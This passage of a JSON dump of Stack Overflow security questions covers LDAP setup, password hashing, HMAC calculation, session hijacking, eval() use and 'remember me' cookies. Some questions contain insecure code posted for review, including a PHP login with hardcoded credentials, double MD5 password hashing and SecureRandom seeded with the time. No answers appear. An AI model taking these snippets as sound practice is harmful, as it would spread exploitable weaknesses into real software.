stops from a man-in-the-middle atack, since everyone who sees the request and sees the signature, can issue the same request again.</p></li>\n<li><p>I would also apreciate if someone shared some bibliography about security or amazon web services or web services in general.</p></li>\n<li><p>How can SSL help in this situation?</p></li>\n</ul>\n\n<p>Thanks!</p>\n"},{"tags":["java","security","payment-gateway","saml-2.0"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":250,"score":1,"question_id":8876419,"title":"Payment Gateway Security for Java Application","body":"<p>Hello I am using payment gateway integration in my Java application, I want secure transactions for this payment gateway. What tool or API should I use for that security.</p>\n\n<p>Is SAML suitable for this? If yes then how can I use it in my Project; if not then please suggest a suitable technology for securing the transaction.</p>\n"},{"tags":["security","api","rest","standards"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12265608,"title":"Is it good to use POST for each HTTP verb in REST API for security reasons?","body":"<p>I am working on an enterprise web app. Our app would be deployed to production in https only. We are writing REST APIs that would be consumed by our html 5 client only (not for others)</p>\n\n<p>My team has taken decision to use POST for all rest verbs, because GET, PUT, DELETE exposes id in the url. </p>\n\n<p>What my team thinks is that, having any type of data exposed in the url is not a good idea, even if id is not directly the database id. </p>\n\n<p>Everybody seems to be agreed to use POST http method for GET, PUT, DELETE and pass http_method as parameter and using the parameter decide what operation to do.</p>\n\n<p>This is the only difference that we are planning to do for REST APIs. What do you think?</p>\n"},{"tags":["security","grails","ldap"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":152,"score":1,"question_id":12250651,"title":"Implementing LDAP authentication in grails with spring-security-core-ldap plugin?","body":"<p>I am currently looking into creating an application within Grails and I have created the app and installed both plugins below:</p>\n\n<p><a href=\"http://grails.org/plugin/spring-security-ldap\" rel=\"nofollow\">http://grails.org/plugin/spring-security-ldap</a>\nhttp://grails.org/plugin/spring-security-core</p>\n\n<p>I then went ahead and run the following command in order to get the security core setup:</p>\n\n<pre><code>grails s2-quickstart com.smstool User Role\n</code></pre>\n\n<p>That then created all the necessary controllers, views and models I would need. From there I then went on to update the config.groovy file with the following options:</p>\n\n<pre><code>grails.plugins.springsecurity.ldap.authorities.groupSearchBase = 'DC=MYLOCATION, DC=COM'\ngrails.plugins.springsecurity.ldap.authorities.retrieveDatabaseRoles = false\ngrails.plugins.springsecurity.ldap.authorities.ignorePartialResultException = true // typically needed for Active Directory\ngrails.plugins.springsecurity.ldap.search.base = 'DC=MYLOCATION, DC=COM'\ngrails.plugins.springsecurity.ldap.search.filter=\"sAMAccountName={0}\" // for Active Directory you need this\ngrails.plugins.springsecurity.ldap.search.searchSubtree = true\ngrails.plugins.springsecurity.ldap.auth.hideUserNotFoundExceptions = false\ngrails.plugins.springsecurity.ldap.search.attributesToReturn = ['mail', 'displayName'] // extra attributes you want returned; see below for custom classes that access this data\ngrails.plugins.springsecurity.providerNames = ['ldapAuthProvider', 'anonymousAuthenticationProvider'] // specify this when you want to skip attempting to load from db and only use LDAP\n\n// role-specific LDAP config \ngrails.plugins.springsecurity.ldap.useRememberMe = false \ngrails.plugins.springsecurity.ldap.authorities.retrieveGroupRoles = true \ngrails.plugins.springsecurity.ldap.authorities.groupSearchBase = 'DC=MYLOCATION, DC=COM'\n</code></pre>\n\n<p>I then ran the application and went to the Login page that was created when i run the first command (s2-quickstart), however when I try to enter my LDAP details I do not get an error however it says the username doesnt exist.</p>\n\n<p>I think this may be due to the fact that there is further configuration needed to get this LDAP functionality to work and the details the user enters are not being passed correctly, also I am new to Grails :-). </p>\n\n<p>I think I may have to do something like create a <strong>\"UserDetailsContextMapper\"</strong> however I do not know how to do this and I have looked at the link below but cant seem to grasp what I need to do:</p>\n\n<p><a href=\"http://grails-plugins.github.com/grails-spring-security-ldap/docs/manual/guide/2.%20Usage.html\" rel=\"nofollow\">http://grails-plugins.github.com/grails-spring-security-ldap/docs/manual/guide/2.%20Usage.html</a></p>\n\n<p>Is there anyone who can help me understand the link above or who knows the steps I should take to properly authenticate against LDAP??</p>\n\n<p>Thanks in advance :-)</p>\n"},{"tags":["security","exploit","fuzzing"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":25,"score":0,"question_id":12264248,"title":"Vulnerable C webapps","body":"<p>I'm looking for old software that is vulnerable to any of the following: Format string exploits, buffer overflow exploits, command inclusion or information disclosure. I know that there are applications out there that are tailored to be vulnerable to some of the above, but I'm specifically looking for software that was released in the real world.</p>\n\n<p>I need this because I'm designing a fuzzer framework. I have already tested it on programs that are vulnerable by design. But now I want to know if it <em>really</em> works. I don't want to be helped, but at the same time I don't want to waste my time on software that isn't really vulnerable. </p>\n\n<p>Hence the need for a vulnerable piece of code that was not meant to be vulnerable (Am I still making sense here?)</p>\n\n<p>Samples in C/C++/C#/Ruby/ASM are doubly appreciated! </p>\n"},{"tags":["asp.net","security","passwords"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":2040,"score":4,"question_id":1179859,"title":"How to implement a password recovery link in ASP.NET?","body":"<p>I am looking for some guidance on implementing a password recovery service in ASP.NET that emails a link to the user which sends them to a password reset page as I don't want to email existing or regenerated passwords in cleartext.<br />\nI have seen some suggestions of using the member id as a querystring parameter however I feel this maybe open to abuse as the custom membership table I am working with uses ints intead of guid's as the id field.<br />\nI'm thinking that I need to create a custom table containing a unique (long) id along with the member id which is populated each time a user requests a password recovery. This id will then be passed as part of the querystring in the link to the password reset page. \nWhen a user clicks on the link the page will look up the id in the custom table and get the member id from there allowing the user to change the password against that membership.<br />\nDoes this seem like a valid approach; is it overkill? Any other suggestions would be greatly appreciated.</p>\n"},{"tags":["security"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":26,"score":1,"question_id":11910066,"title":"Is Mutul authentication is a must for TLS?","body":"<p>I am working with RADIUS authentication using EAP-TLS. I used self signed CA and Server/Client certificate to establish mutual authentication.</p>\n\n<p>that being said, is it absolutely necessary to have both server and client certificate to establish TLS ? If so then how does browser authenticates with only server certificate?\nalso EAP-PEAP (mschapv2) uses only server certificate to establish secure tunnel.</p>\n\n<p>What are the handshake messages between server and client by which encryption key is derived.\nthanks,</p>\n"},{"tags":["security","hash"],"answer_count":15,"favorite_count":42,"up_vote_count":87,"down_vote_count":1,"view_count":15565,"score":86,"question_id":348109,"title":"Is \"double hashing\" a password less secure than just hashing it once?","body":"<p>Is hashing a password twice before storage any more or less secure than just hashing it once?</p>\n\n<p>What I'm talking about is doing this:</p>\n\n<pre><code>$hashed_password = md5( md5( plaintext_password ) );\n</code></pre>\n\n<p>instead of just this:</p>\n\n<pre><code>$hashed_password = md5( plaintext_password );\n</code></pre>\n\n<p>If it is less secure, can you provide a good explanation (or a link to one)?</p>\n\n<p>Also, does the hash function used make a difference?  Does it make any difference if you mix md5 and sha1 (for example) instead of repeating the same hash function?</p>\n\n<p>Note 1:  When I say \"double hashing\" I'm talking about hashing a password twice in an attempt to make it more obscured.  I'm not talking about the <a href=\"http://en.wikipedia.org/wiki/Double_hashing\" rel=\"nofollow\">technique for resolving collisions</a>.</p>\n\n<p><strong>Note 2:  I know I need to add a random salt to really make it secure.  The question is whether hashing twice with the same algorithm helps or hurts the hash.</strong></p>\n"},{"tags":["java","security","encryption","random","cryptography"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":117,"score":1,"question_id":12249235,"title":"SecureRandom safe seed in Java","body":"<p>Is this piece of code safe?</p>\n\n<pre><code> SecureRandom randomizer = new SecureRandom(String.valueOf(new Date().getTime()).getBytes());\n</code></pre>\n\n<p>Is this the right way to instance the seed of secure random?</p>\n"},{"tags":["c#","security","cryptography"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":183,"score":1,"question_id":12185122,"title":"Calculating HMACSHA256 using c# to match payment provider example","body":"<p>For a payment provider, I need to calculate a hash-based message authentication code, using HMAC-SHA256. That is causing me quite a bit of trouble.</p>\n\n<p>The payment provider gives two examples of orrectly calculated authentication code in pseudo-code. All keys are in hex.</p>\n\n<h3>Method 1</h3>\n\n<pre><code>key = 57617b5d2349434b34734345635073433835777e2d244c31715535255a366773755a4d70532a5879793238235f707c4f7865753f3f446e633a21575643303f66\nmessage = \"amount=100&amp;currency=EUR\"\nMAC = HMAC-SHA256( hexDecode(key), message )\nresult = b436e3e86cb3800b3864aeecc8d06c126f005e7645803461717a8e4b2de3a905\n</code></pre>\n\n<h3>Method 2</h3>\n\n<pre><code>message = \"amount=100&amp;currency=EUR\"\nKi = 61574d6b157f757d02457573556645750e0341481b127a07476303136c005145436c7b46651c6e4f4f040e1569464a794e534309097258550c17616075060950\nKo = 0b3d27017f151f17682f1f193f0c2f1f64692b227178106d2d096979066a3b2f2906112c0f760425256e647f032c2013243929636318323f667d0b0a1f6c633a\nMAC = SHA256( hexDecode(Ko) + SHA256( hexDecode(Ki) + message ) )\nresult = b436e3e86cb3800b3864aeecc8d06c126f005e7645803461717a8e4b2de3a905\n</code></pre>\n\n<p>I tried to write the code to do this, after doing some research, but I keep coming up with different results.</p>\n\n<pre><code>private static void Main(string[] args)\n    {\n        var key = \"57617b5d2349434b34734345635073433835777e2d244c31715535255a366773755a4d70532a5879793238235f707c4f7865753f3f446e633a21575643303f66\";\n        var ki = \"61574d6b157f757d02457573556645750e0341481b127a07476303136c005145436c7b46651c6e4f4f040e1569464a794e534309097258550c17616075060950\";\n        var ko = \"0b3d27017f151f17682f1f193f0c2f1f64692b227178106d2d096979066a3b2f2906112c0f760425256e647f032c2013243929636318323f667d0b0a1f6c633a\";\n        var mm = \"amount=100&amp;currency=EUR\";\n\n        var result1 = CalcHMACSHA256Hash(HexDecode(key), mm);\n\n        var result2 = CalcSha256Hash(string.Format(\"{0}{1}\", HexDecode(ko), CalcSha256Hash(HexDecode(ki) + mm)));\n\n        Console.WriteLine(\"Expected: b436e3e86cb3800b3864aeecc8d06c126f005e7645803461717a8e4b2de3a905\");\n        Console.WriteLine(\"Actual 1: \" + result1);\n        Console.WriteLine(\"Actual 2: \" + result2);\n\n        Console.WriteLine(\"------------------------------\");\n        Console.ReadKey();\n\n    }\n\n    private static string HexDecode(string hex)\n    {\n        var sb = new StringBuilder();\n        for (int i = 0; i &lt;= hex.Length - 2; i += 2)\n        {\n            sb.Append(Convert.ToString(Convert.ToChar(Int32.Parse(hex.Substring(i, 2), System.Globalization.NumberStyles.HexNumber))));\n        }\n        return sb.ToString();\n    }\n\n    private static string CalcHMACSHA256Hash(string plaintext, string salt)\n    {\n        string result = \"\";\n        var enc = Encoding.Default;\n        byte[]\n        baText2BeHashed = enc.GetBytes(plaintext),\n        baSalt = enc.GetBytes(salt);\n        System.Security.Cryptography.HMACSHA256 hasher = new HMACSHA256(baSalt);\n        byte[] baHashedText = hasher.ComputeHash(baText2BeHashed);\n        result = string.Join(\"\", baHashedText.ToList().Select(b =&gt; b.ToString(\"x2\")).ToArray());\n        return result;\n    }\n\n\n    public static string CalcSha256Hash(string input)\n    {\n        SHA256 sha256 = new SHA256Managed();\n        byte[] sha256Bytes = Encoding.Default.GetBytes(input);\n        byte[] cryString = sha256.ComputeHash(sha256Bytes);\n        string sha256Str = string.Empty;\n        for (int i = 0; i &lt; cryString.Length; i++)\n        {\n            sha256Str += cryString[i].ToString(\"x2\");\n        }\n        return sha256Str;\n    }\n</code></pre>\n\n<p>And this is the result I get:</p>\n\n<pre><code>Expected: b436e3e86cb3800b3864aeecc8d06c126f005e7645803461717a8e4b2de3a905\nActual 1: 421ce16f2036bb9f2a3770c16f01e9220f0232d45580584ca41768fd16c15fe6\nActual 2: 290f14398bf8c0959dfc963e2fd9c377534c6fec1983025d2ab192382f132b92\n</code></pre>\n\n<p>So with none of the two methods, I can get the result the provider example wants.</p>\n\n<p><strong>What am I missing here? Is it encoding? Is my hexDecode screwed up?</strong></p>\n\n<p>Test tool from payment provider: <a href=\"http://tech.dibs.dk/dibs_api/other_features/hmac_tool/\" rel=\"nofollow\">http://tech.dibs.dk/dibs_api/other_features/hmac_tool/</a></p>\n\n<p>PHP sample code: <a href=\"http://tech.dibspayment.com/dibs_api/other_features/mac_calculation/\" rel=\"nofollow\">http://tech.dibspayment.com/dibs_api/other_features/mac_calculation/</a></p>\n"},{"tags":["php","security","zend-framework","php-5.3"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":51,"score":1,"question_id":6643769,"title":"Where to set \"define()\" within ZendFramework to ensure persistence","body":"<p>I am currently working on some authentification and cryptography stuff.\nI thought about implementing my APP_SECRET (aka Salt) globally with define.</p>\n\n<p>The problem is I do not want to put the APP_SECRET in my index.php due to security reasons.\nWhich is the next but earliest executed file I should insert my APP_SECRET in?</p>\n"},{"tags":["php","javascript","ajax","security","hash"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":90,"score":1,"question_id":12261644,"title":"Ajax login technique (backend php)","body":"<p>I read lots of info about login security, and most with Ajax\nMainly I was thinking to pass via javascript the password and username in plain text, and in php hash it.\nThis way: \nJS plain text > php hash > database</p>\n\n<p>What about hash twice during Ajax ? Do you think it's good?\nLike this: \nJS hash > php hash > database</p>\n\n<p>So I don't care about hackers during Ajax request and of course another hash on the server will make it more secure and it's one of the best hashing method I found. Using JS hashing I will never recive the real password on the server, but, I don't need the real password, just an hash to compare the passwords hashed.</p>\n\n<p>Better with JS hashing or I can go with just php hash?</p>\n"},{"tags":["iphone","objective-c","ios","security"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":46,"score":2,"question_id":12260744,"title":"How to view NSString defined in a given iOS ipa file","body":"<p>I remember I have done this before, but forgot the command.</p>\n\n<p>e.g.</p>\n\n<p>I have a NSString defined in source, e.g.</p>\n\n<pre><code>NSString * s = @\"secret\";\n</code></pre>\n\n<p>I remember I can view the content using the <code>strings</code> command, but I forgot the exact command to view it, </p>\n\n<p>e.g.</p>\n\n<pre><code>strings my.ipa | grep \"secret\"\n</code></pre>\n\n<p>does not work. Anyone have idea?</p>\n"},{"tags":["spring","security","ejb"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":38,"score":1,"question_id":12259092,"title":"transferring Principal from EJBContext to Spring SecurityContext","body":"<p>I'm using springsecurity to protect some EJB methods deployed on jBoss 5.1.0.</p>\n\n<p>I'm looking for a nice way to transfer the <code>java.security.Principal</code> retrieved from the <a href=\"http://docs.oracle.com/javaee/6/api/javax/ejb/EJBContext.html\" rel=\"nofollow\">EJBContext</a>, by calling <code>getPrincipal()</code>, to the Spring <a href=\"http://static.springsource.org/spring-security/site/docs/3.0.7.RELEASE/apidocs/org/springframework/security/core/context/SecurityContext.html\" rel=\"nofollow\">SecurityContext</a>.</p>\n\n<p>I wouldn't like to give up the springsecurity schema, just need to set the <code>Principal</code> before the execution of the <a href=\"http://static.springsource.org/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/access/intercept/aopalliance/MethodSecurityInterceptor.html\" rel=\"nofollow\">MethodSecurityInterceptor</a>.</p>\n\n<p>Any idea?</p>\n"},{"tags":["security","powershell","filter","cmdlet","gpo"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":109,"score":1,"question_id":12249658,"title":"Setting GPO security filter with powershell Set-GPPermissions cmdlet","body":"<p>According to <a href=\"http://technet.microsoft.com/en-us/library/ee461038.aspx\" rel=\"nofollow\">Microsoft</a> the cmdlet <a href=\"http://technet.microsoft.com/en-us/library/ee461038.aspx\" rel=\"nofollow\">Set-GPPermissions</a> accepts the option \"-replace\":</p>\n\n<blockquote>\n  <p>\"This ensures that the existing permission level is replaced by the new permission level.\"</p>\n</blockquote>\n\n<p>I import a GPO from PowerShell. After that I want to set the security filters. After importing, before setting the security filter, the Security Filtering of the GPO is \"Authenticated Users\". Now I want to remove that filter option and replace it with \"myGroup\". To do so I use the following command:</p>\n\n<pre><code>Set-GPPermissions -Name \"myGPO\" -PermissionLevel GpoApply -TargetName \"myGroup\" -TargetType Group -replace\n</code></pre>\n\n<p>The results are that there is a new security filter added which references \"myGroup\", but the Group \"Authenticated Users\" is not being removed. The Powershell cmdlet is not <em>replacing</em> the filter, it's <em>adding</em> it.</p>\n\n<p>Hints?</p>\n\n<p>Thanks in advance!</p>\n"},{"tags":["security","networking"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":52,"score":0,"question_id":11527587,"title":"One web application provide both public and internal API, how to protect the internal API?","body":"<p>A web application (war) provides two set of HTTP APIs, one is public to the clients on Internet, another is for internal and should not public to Internet. What is the best practice on network deployment to protect the internal API?</p>\n\n<p>I know that a common way is to split the application into two deployables, put the frontend which serves public API in DMZ and put the backend which serves internal API in internal network. But for some reason I want to keep the application as one deployable.</p>\n"},{"tags":["c++","security","templates","destructor"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12258577,"title":"Template to perform automatic memory overwrite on destruction","body":"<p>It is a common pattern to use templates to enforce the compiler to initialize primitive / POD types values (<a href=\"http://stackoverflow.com/a/11493744/16673\">http://stackoverflow.com/a/11493744/16673</a> or <a href=\"http://www.codeproject.com/Articles/825/Using-templates-for-initialization\" rel=\"nofollow\">http://www.codeproject.com/Articles/825/Using-templates-for-initialization</a>).</p>\n\n<p>Does a similar pattern exist that could be used to erase the value once it goes out of scope for security reasons, to make sure the value is not left on the stack once the variable is destructed? I am afraid a naive analogous implementation might not work, as the compiler is free to ignore any assignments to a value which is going out of scope, as the value can be trivially proven not to be used any more. Is there some consistent and reasonably portable solution e.g. using volatile?</p>\n"},{"tags":["php","security","login"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":121,"score":-1,"question_id":11881220,"title":"PHP login system. Safe?","body":"<p>I am building a small cms system. The user can login and edit, delete or create a new item in the database.</p>\n\n<p>My question is. Is this login system safe enough?</p>\n\n<pre><code>&lt;?php \nsession_start(); ?&gt;\n&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n&lt;head&gt;\n&lt;meta charset=\"utf-8\"&gt;\n&lt;title&gt;.....&lt;/title&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n&lt;?php\n\n    include 'koder.inc.php';\n\n\nif(!isset($_POST['forsoeg'])){\n    $forsoeg = 0;\n    $check_user='0';\n    $check_pass='0';\n} else {\n    $forsoeg = $_POST['forsoeg'];\n    $check_user = $_POST['username'];\n    $check_pass = $_POST['password']; }\n\n    if($check_user != $username || $check_pass != $password)     {\n        if($forsoeg &gt;3){\n            exit(\"&lt;p&gt;Wrong password or username &lt;br /&gt;&lt;br /&gt;\n            &lt;a href='admin_logon.php'&gt;back to login&lt;/a&gt;&lt;/p&gt;\");}\n\n\n            $forsoeg ++;  \n\n            ?&gt;\n&lt;h1&gt;Login&lt;/h1&gt;\n&lt;form action=\"&lt;?php echo $_SERVER['PHP_SELF']; ?&gt;\" method=\"post\" name=\"form\"&gt;\n  &lt;p&gt;\n    &lt;label for=\"username\"&gt;username:&lt;/label&gt;\n    &lt;br /&gt;\n    &lt;input title=\"username:\" type=\"text\" name=\"username\"  /&gt;\n  &lt;/p&gt;\n  &lt;p&gt;\n    &lt;label for=\"password\"&gt;Password:&lt;/label&gt;\n    &lt;br /&gt;\n    &lt;input title=\"Skriv dit password\" type=\"text\" name=\"password\"  /&gt;\n  &lt;/p&gt;\n  &lt;p&gt;\n    &lt;input class=\"knap\" type=\"submit\" name=\"Send\" value=\"Login\" /&gt;\n  &lt;/p&gt;\n  &lt;input type=\"hidden\" name=\"forsoeg\" value=\"&lt;?php echo $forsoeg; ?&gt;\"  /&gt;\n&lt;/form&gt;\n&lt;?php\n\n    } else {\n        $_SESSION['logon']=\"ok\";\n\n        echo \"Login ok..&lt;br /&gt;\n        &lt;a href='administration.php'&gt;Go to admin page&lt;/a&gt;\"; } ?&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n</code></pre>\n\n<p>I then include the fil koder.inc.php</p>\n\n<pre><code>&lt;?php \n\n $username = \"test\";\n $password = \"123456\";\n\n\n?&gt; \n</code></pre>\n\n<p>And on the pages that need a valid user i start the page with </p>\n\n<pre><code>&lt;?php \nsession_start(); ?&gt;\n</code></pre>\n"},{"tags":["sql-server","database","security","database-design","web-applications"],"answer_count":8,"favorite_count":4,"up_vote_count":6,"down_vote_count":0,"view_count":1941,"score":6,"question_id":1199886,"title":"Stored Procedures vs No Stored Procedures - Security Viewpoint","body":"<p>For a web application database, from a security standpoint <strong>only</strong>, what are arguments counter to the point for an sp only solution where the app db account has no rights to tables and views and only exec on sps?</p>\n\n<p>If someone intercepts the app db account, the surface area exposed to an attack is much less then when tables and views aren't exposed.  What security advantages would a non sp solution offer (or not)?  I see many advantages to using a non sp solution, but exposing all the tables leaves me a little worried.</p>\n\n<p>The question is for major database vendor products in general but specifically, sql server 2008.</p>\n"},{"tags":["php","security","session"],"answer_count":4,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":179,"score":8,"question_id":12233406,"title":"Preventing session hijacking","body":"<p>How do you prevent multiple clients from using the same session ID? I'm asking this because I want to add an extra layer of security to prevent session hijacking on my website. If a hacker somehow figures out another user's session ID and makes requests with that SID, how can I detect that there are different clients sharing a single SID on the server and then reject the hijack attempt?</p>\n\n<p><strong>EDIT</strong></p>\n\n<p>I have accepted Gumbo's answer after careful consideration because I've come to the realization that what I'm asking for is impossible due to the restrictions of a <em>stateless HTTP protocol</em>. I forgot about what is perhaps the most fundamental principle of HTTP, and now that I think about this question seems a bit trivial.</p>\n\n<p>Let me elaborate what I mean:</p>\n\n<p>After User A logs in on example.com, he is given some random session ID, for simplicity's sake, let it be 'abc123'. This session ID is stored as a cookie on the client side and is validated with a server-side session to ensure the user who logged in remains logged in as he moves from one webpage to another. This cookie of course would not need to exist if HTTP were not stateless. For that reason, if User B steals User A's SID, and creates a cookie on his computer with the value 'abc123', he would have successfully hijacked User A's session, but there is simply no way for the server to legitimately recognize that User B's request is any different from User A's requests, and therefore the server has no reason to reject any request. Even if we were to list the sessions that were already active on the server and try to see if someone is accessing a session that is already active, how can we determine that it is another user who is accessing the session illegitimately and not the same user who is already logged in with a session ID, but simply trying to make another request with it (ie navigate to a different webpage). We can't. Checking the user agent? Can be spoofed - but good as a Defense in Depth measure nevertheless. IP Address? Can change for legitimate reasons - but instead of not checking for the IP address at all, I suggest checking something like the first two octets of the IP, as even a user on a data plan network who constantly has a changing IP for perfectly legitimate reasons would only usually have the last two octets of their IP change.</p>\n\n<p>In consclusion, it is the stateless HTTP that condemns us to never being able to fully protect our websites from session hijacking, but good practices (like the ones Gumbo has provided) will be good enough to prevent a good majority of session attacks. Trying to protect sessions from hijacking by denying multiple requests of the same SID is therefore simply ludicrous, and would defeat the whole purpose of sessions.</p>\n"},{"tags":["php","wordpress","security","eval"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":88,"score":2,"question_id":12255271,"title":"How Can eval() in This Code Be Not Secure?","body":"<p>I'm using the code below to automatically load and declare classes so that I only need to put class files in a folder named classes. The part in spl_autoload_regsister() may seem to be unnecessary for you but it is needed to work as a WordPress plugin without errors.  </p>\n\n<p>It uses <code>eval()</code> and I've seen so many web pages talking about using <code>eval()</code> is bad and can create a security hole. So how could this be dangerous? </p>\n\n<pre><code>$strDirPath = dirname(__FILE__) . '\\\\classes\\\\';\n$arrClassFiles = array_map(create_function( '$a', 'return basename($a, \".php\");' ), glob($strDirPath . '*.php'));\nspl_autoload_register(\n    create_function('$class_name', '\n        global $arrClassFiles, $strDirPath;\n        if (in_array($class_name, $arrClassFiles)) \n            include($strDirPath . $class_name . \".php\");' )\n);\n\nforeach ($arrClassFiles as $strClassName) {\n    $strClassName_alpha = $strClassName . \"_Alpha\";\n    eval(\"class $strClassName_alpha extends $strClassName {};\");    \n}\n\nprint_r(get_declared_classes());    \n</code></pre>\n\n<p>Maybe, somebody can put a file name of php code in the folder? But I don't see it can compromise the system.</p>\n"},{"tags":["asp.net","security"],"answer_count":1,"favorite_count":6,"up_vote_count":13,"down_vote_count":0,"view_count":4334,"score":13,"question_id":2594960,"title":"Best Practice to Implement Secure \"Remember Me\"","body":"<p>Sometimes, I come across certain web development frameworks which don't provide an authentication feature, such as in Authentication ASP.NET.</p>\n\n<p>I was wondering what security measures need to be considered when implementing \"Remember Me\" login features, by hand coding?</p>\n\n<p>Here are the things I usually do:</p>\n\n<ol>\n<li><p>Store the user name in cookie. The user name is not encrypted.</p></li>\n<li><p>Store a secret key in a cookie. The secret key is generated using one way function based on user name. The server will verify secret key against user name, to ensure this user name is not being changed.</p></li>\n<li><p>Use HttpOnly in cookie. <a href=\"http://www.codinghorror.com/blog/2008/08/protecting-your-cookies-httponly.html\" rel=\"nofollow\">http://www.codinghorror.com/blog/2008/08/protecting-your-cookies-httponly.html</a></p></li>\n</ol>\n\n<p>Anything else I have missed, which could possibly lead a security holes?</p>\n"},{"tags":["php","database","security","limit","user-generated-content"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12250985,"title":"How to set limits for amount of user-generated content per user","body":"<p>What is the best way to implement limits for users in applications like discussion boards, image hostings etc. ?</p>\n\n<p>Let's say we want to set limits for StackOverflow. Anonymous users should be able to post 50 questions per 12h and registered users 100 per 12h.</p>\n\n<p>I thought about creating a database and storing information about IPs/users and their posts. Data would be erased after 12h.</p>\n\n<p>However, such solution can be easily hacked. A single IP shouldn't generate more than 100 questions, but what if one user create several accounts on the same IP? Every account has its own limit, so user could generate unlimited amount of questions.</p>\n\n<p>I would have to limit number of accounts per IP (what with schools/other places with many users and single IP?).</p>\n"},{"tags":["security"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":12254263,"title":"When the RSA algorithm is used in SSL","body":"<p>I would like to know when the RSA algorithm is used in SSL. Which step it is used? (Handshake step or other)</p>\n"},{"tags":["c#","sql-server","security","reporting-services","cas"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":272,"score":1,"question_id":7054335,"title":"SSRS External Assembly: SecurityPermission in Preview Pane?","body":"<p>ok.. spent 3 days with this, learned a lot about this issue, but still can't quite get around it. </p>\n\n<p>I have a SSRS Report, that references <strong>external assembly which connects to sql server</strong>, and while previewing this report in Visual Studio, i get the following exception: </p>\n\n<blockquote>\n  <p><strong>SecurityException: Request for the permission of type SqlClientPermission failed</strong></p>\n</blockquote>\n\n<p>so, i added this code: </p>\n\n<pre><code>new SqlClientPermission(PermissionState.Unrestricted).Assert();\n</code></pre>\n\n<p>but this in turn causes this exception:</p>\n\n<blockquote>\n  <p><strong>SecurityException: Request for permission of type SecurityPermission failed</strong></p>\n  \n  <p><strong>The zone of the assembly that failed was: MyComputer</strong></p>\n</blockquote>\n\n<p><strong>from what i've read, this problem should not occur in visual studio preview pane, because  code should run in full trust?</strong> </p>\n\n<p>Never the less, i went ahead and <a href=\"http://support.microsoft.com/kb/842419\" rel=\"nofollow\">followed all of the instructions here</a>, in order to give my assembly full trust. I tried adding it by URL, and by Strong Name. </p>\n\n<pre><code>&lt;CodeGroup class=\"UnionCodeGroup\"\n   version=\"1\"\n   PermissionSetName=\"FullTrust\"\n   Name=\"MyNewCodeGroup\"&gt;\n   &lt;IMembershipCondition class=\"UrlMembershipCondition\"\n      version=\"1\"\n      Url=\"C:\\Program Files (x86)\\Microsoft Visual Studio 9.0\\Common7\\IDE\\PublicAssemblies\\MyAssembly.dll\"/&gt;\n&lt;/CodeGroup&gt;\n</code></pre>\n\n<p>I also saw <a href=\"http://blogs.msdn.com/b/bimusings/archive/2005/06/16/429795.aspx\" rel=\"nofollow\">this post</a>, and tried putting my code group in the place suggested there. </p>\n\n<p>Furthermore, i tried signing my assembly, and adding a CodeGroup based on strong name (also in My_Computer_Zone. </p>\n\n<p>I also tried using caspol.exe with:</p>\n\n<pre><code>caspol -af myassembly.dll\n</code></pre>\n\n<p>So, i think myassembly runs in full trust (although not 100% sure). <strong>I can't figure out why, i still get these permission errors from Visual Studio Preview pane</strong>. </p>\n\n<p>What exactly is needed for my code to be able to Assert that sql permission? </p>\n\n<p><strong>UPDATE</strong></p>\n\n<p>i set up a local instance of SSRS server. i can deploy my report there, and it works (since i already added full trust for it), but it STILL won't work in VS. This is a temporary work around, but it sucks for development because it takes long to deploy and eats up a ton of ram.. </p>\n"},{"tags":["php","security","encryption","obfuscation"],"answer_count":6,"favorite_count":3,"up_vote_count":4,"down_vote_count":0,"view_count":1450,"score":4,"question_id":1551463,"title":"PHP Source Encryption - Effectiveness and Disadvantages","body":"<p>I have some PHP source code that I'm hosting with hosting company XYZ. I'm using a PHP encryption software like Zend Guard or ionCube to protect the source from being viewed by anyone (sysadmin or hacker that hacks the sysadmin).</p>\n\n<ul>\n<li><p>How easy/hard is it for someone who has full access to the system (like the sysadmin or hacker that hacks the sysadmin) to decrypt the source? I don't know how encryption software work, but I'm assuming they use some key, which would have to stay on the server and is therefore accessible to a sysadmin or a hacker. If you're technically-knowledgeable about the how-to, don't hesitate to offer an explanation in your answer.</p></li>\n<li><p>Does the use of such source encryption slow down the site? If anyone has first-hand experience or knows from someone that has first-hand experience ;)</p></li>\n</ul>\n\n<p>I'm interested in the technical aspects of this, how effective encryption is.. and its disadvantages, from those who used them or considered using them</p>\n\n<p>Thanks (all helpful answers/comments are up voted)</p>\n\n<p>Edit: the answers so far seem to be ignoring what I'm trying to understand.. I'm trying to understand the effectiveness of encryption. I don't really have any code that needs protection from the bad guys, the above was just an example, so advice like open source it or hire a lawyer don't really address my technical curiosity.. A+ to anyone who gets the 